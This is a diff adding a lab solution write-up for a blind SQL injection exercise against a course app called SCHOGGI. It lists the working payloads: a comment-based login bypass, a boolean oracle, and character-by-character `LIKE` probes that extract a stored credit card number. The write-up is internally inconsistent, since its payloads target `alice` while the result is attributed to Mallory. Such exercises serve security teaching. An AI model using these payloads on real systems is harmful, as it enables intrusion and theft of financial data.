@@ -235,3 +235,43 @@ Or in Humanized form:
 - Password hash:`5cb7285acef8307dd824faa96b4956971730641083237f393bded9591ff10eae
 - Credit Card number: `2028 4889 0003 9887`
 
+# 3 SCHOGGI: Blind SQL Injection Solution
+
+## Attack Steps Description
+
+### Step 1: Initial Reconnaissance
+- Tested login with existing username `alice` vs non-existing username `test`
+- Observed different HTTP responses in Burp Suite:
+  - Existing user: `Invalid user or password`
+  - Non-existing user: `Error during login`
+
+### Step 2: Confirming SQL Injection
+- Injected `alice'-- ` as username
+- Got `Invalid user or password` (expected `Error during login`)
+- Confirms vulnerability: query becomes `SELECT * FROM users WHERE username='alice'--'`
+
+### Step 3: Establishing the Oracle
+- Tested `alice' AND (1=1)-- ` → `Invalid user or password` (TRUE)
+- Tested `alice' AND (1=0)-- ` → `Error during login` (FALSE)
+- Oracle: TRUE = "Invalid user or password", FALSE = "Error during login"
+
+### Step 4: Extracting Credit Card with LIKE Pattern
+Used LIKE with wildcard `%` to guess each character:
+
+**Character 1:**
+`alice' AND credit_card LIKE '2%'-- ` → Invalid user or password ✓
+
+**Character 2:**
+`alice' AND credit_card LIKE '20%'-- ` → Invalid user or password ✓
+
+**Character 3:**
+`alice' AND credit_card LIKE '203%'-- ` → Invalid user or password ✓
+
+**Character 4:**
+`alice' AND credit_card LIKE '2034%'-- ` → Invalid user or password ✓
+
+Continued this pattern, testing 0-9 and space for each position until no match found.
+
+## First Four Characters of Mallory's Credit Card
+
+**2034**
